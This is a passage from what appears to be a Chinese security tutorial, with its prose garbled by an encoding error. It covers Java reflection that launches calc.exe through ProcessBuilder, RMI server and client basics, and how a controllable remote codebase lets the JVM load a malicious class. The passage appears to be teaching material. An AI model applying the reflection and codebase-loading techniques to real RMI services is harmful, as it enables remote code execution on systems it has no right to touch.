style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆèŽ·å–åˆ°&lt;code>start&lt;/code>æ–¹æ³•ï¼Œç„¶åŽ&lt;code>invoke&lt;/code>æ‰§è¡Œï¼Œinvoke çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ProcessBuilder Objectï¼Œé€»è¾‘ä¹Ÿæ˜¯å¾ˆé¡ºçš„ï¼šå…ˆèŽ·å–è¦æ‰§è¡Œçš„æ–¹æ³•ï¼Œç„¶åŽä¼ å…¥æ‰§è¡Œçš„å‚æ•°&lt;/p>
&lt;p>å¦‚æžœè¦ä½¿ç”¨ProcessBuilderçš„å¦ä¸€ä¸ªé‡è½½ï¼ˆå‚æ•°ä¸ºå¯å˜é•¿å‚æ•°String&amp;hellip; command ç›¸å½“äºŽæ•°ç»„ï¼‰ï¼Œå¯ä»¥è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[][]{{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}})).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="rmi">RMI&lt;/h2>
&lt;p>å³Remote Method Invocationï¼Œä¸è®©å®ƒRCEéƒ½å¯¹ä¸èµ·è¿™ä¸ªR&lt;/p>
&lt;h3 id="é€šä¿¡å®žçŽ°">é€šä¿¡å®žçŽ°&lt;/h3>
&lt;p>Serverç¼–å†™å®žçŽ°ç±»å¹¶æ³¨å†Œä¸ºæœåŠ¡createRegistryï¼ŒClientæŸ¥æ‰¾æœåŠ¡å¹¶èŽ·å¾—æŽ¥å£å®žä¾‹getRegistryï¼Œä¸¤è€…å…±äº«ç›¸åŒçš„æŽ¥å£interface&lt;/p>
&lt;p>å½“Clientè¿žæŽ¥æ—¶ï¼Œé¦–å…ˆè¿žæŽ¥Registryå¹¶å¯»æ‰¾æƒ³è¦çš„å¯¹è±¡ï¼Œå‘é€Callæ¶ˆæ¯ï¼›ä¹‹åŽServerè¿”å›žå¯¹è±¡ï¼ˆåºåˆ—åŒ–æ•°æ®ï¼‰ï¼ŒReturnDataæ¶ˆæ¯ï¼›Clientæ”¶åˆ°åŽååºåˆ—åŒ–å¾—åˆ°è¿œç¨‹å¯¹è±¡ï¼Œä¸Žå…¶å»ºç«‹TCPè¿žæŽ¥ï¼Œåœ¨è¿™ä¸ªæ–°çš„è¿žæŽ¥ä¸­æ‰ä¼šåœ¨Serverç«¯æ‰§è¡Œæ–¹æ³•è°ƒç”¨&lt;/p>
&lt;p>å¯ä»¥ç›´æŽ¥é€šè¿‡rmi://xxx:xxx/è¿™æ ·çš„åœ°å€èŽ·å–æ‰€æœ‰ç»‘å®šçš„å¯¹è±¡ï¼ˆç›´é€šRMI RegistryåŽå°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://ip:port&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºŽrebind, bind, unbindè¿™æ ·çš„å±é™©æ–¹æ³•åªæœ‰å½“æ¥æºæ˜¯locahostæ‰è¡Œï¼Œè¿œç¨‹ç”¨ä¸äº†&lt;/p>
&lt;p>å¯¹äºŽååºåˆ—åŒ–æ•°æ®ï¼Œå¯ä»¥ç”¨&lt;a href="https://github.com/NickstaDB/SerializationDumper/releases/">SerializationDumper&lt;/a>è¿›è¡Œåˆ†æžï¼Œç”¨wireshark å¤åˆ¶-&amp;gt; as a hex Stream&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -jar SerializationDumper-v1.1.jar &lt;span style="color:#d88200">&amp;#34;deadbeaf&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html&lt;/a>&lt;/p>
&lt;p>ä¸€ä¸ªç®€å•çš„rmiserver&amp;amp;rmiclientçš„æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RMIServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RemoteHelloWorld&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">IRemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#75af00">RemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;call from&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RemoteHelloWorld&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">9092&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:9092/Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">client&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">server.RMIServer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TrainMain&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RMIServer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IRemoteHelloWorld&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9092/Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="codebase-to-rce">codebase to RCE&lt;/h3>
&lt;p>codebaseæ˜¯ç±»ä¼¼classpathçš„ä¸€ä¸ªåœ°å€ï¼Œå‘ŠçŸ¥JVMåŽ»å“ªé‡Œæœç´¢ç±»ï¼Œå¸¸ç”¨äºŽhttp, ftpè¿™æ ·è¿œç¨‹çš„æƒ…å†µ&lt;/p>
&lt;p>åœ¨RMIé€šä¿¡è¿‡ç¨‹ä¸­ï¼Œååºåˆ—åŒ–å¯¹è±¡æ—¶å¯»æ‰¾ç±»æ—¶å…ˆåœ¨è‡ªå·±çš„classpathä¸‹å¯»æ‰¾ï¼Œå¦‚æžœæœ¬åœ°æ‰¾ä¸åˆ°å°±å›žåŽ»è¿œç¨‹åŠ è½½codebaseä¸­çš„ç±»ï¼Œå‡å¦‚æˆ‘ä»¬æŒ‡å®š&lt;code>codebase=http://example.com/&lt;/code> ç„¶åŽåŠ è½½&lt;code>org.test.vuln&lt;/code>ç±»ï¼Œjvmå°±ä¼šä¸‹è½½&lt;code>http://example.com/org/test/vuln.class&lt;/code> å¹¶å°†å…¶ä½œä¸ºvulnç±»çš„å­—èŠ‚ç è¿›è¡ŒåŠ è½½&lt;/p>
&lt;p>æ‰€ä»¥å¦‚æžœcodebaseå¯æŽ§ï¼Œå†æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œå°±å¯ä»¥åŠ è½½æ¶æ„ç±»äº†ï¼š&lt;/p>
&lt;ul>
&lt;li>å®‰è£…å¹¶é…ç½®äº†SecurityManager&lt;/li>
&lt;li>Javaç‰ˆæœ¬ä½ŽäºŽ7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº† java.rmi.server.useCodebaseOnly=false&lt;/li>
&lt;/ul>
&lt;p>java.rmi.server.useCodebaseOnlyæ˜¯åœ¨Java 7u21ã€6u45çš„æ—¶å€™ä¿®æ”¹çš„ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼Œå€¼ç”±falseæ”¹ä¸ºäº†trueï¼›åœ¨ä¸ºtrueçš„æƒ…å†µä¸‹JVMåªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„codebaseï¼Œä¸æ”¯æŒä»ŽRMIä¸­èŽ·å–ï¼Œä»¥ä¸‹æ˜¯æµ‹è¯•ä»£ç ï¼š&lt;/p>
&lt;p>Serveréƒ¨åˆ†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Calc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.server.UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Calc&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// CalcServer.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">server&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CalcServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
